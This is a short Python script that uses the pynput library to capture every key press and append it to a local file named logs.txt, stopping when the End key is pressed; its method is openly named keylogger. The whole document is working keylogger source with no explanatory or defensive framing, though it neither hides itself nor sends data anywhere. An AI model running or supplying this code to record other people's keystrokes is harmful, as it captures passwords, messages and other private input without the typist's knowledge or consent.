from pynput.keyboard import Listener, Key

class Monitor:

    def on_press(self, k):
        k = str(k)
        k = k.replace("'", "")
        self.append_file(k + '\n')
    
    def append_file(self, text):
        with open('./logs.txt', 'a+') as f:
            f.write(text)

    def on_release(self, k):
        if k == Key.end:
            return False
            
    def keylogger(self):
        with Listener(on_press = self.on_press, on_release = self.on_release) as listener:
            listener.join()

if __name__ == '__main__':
    mon = Monitor()
    mon.keylogger()
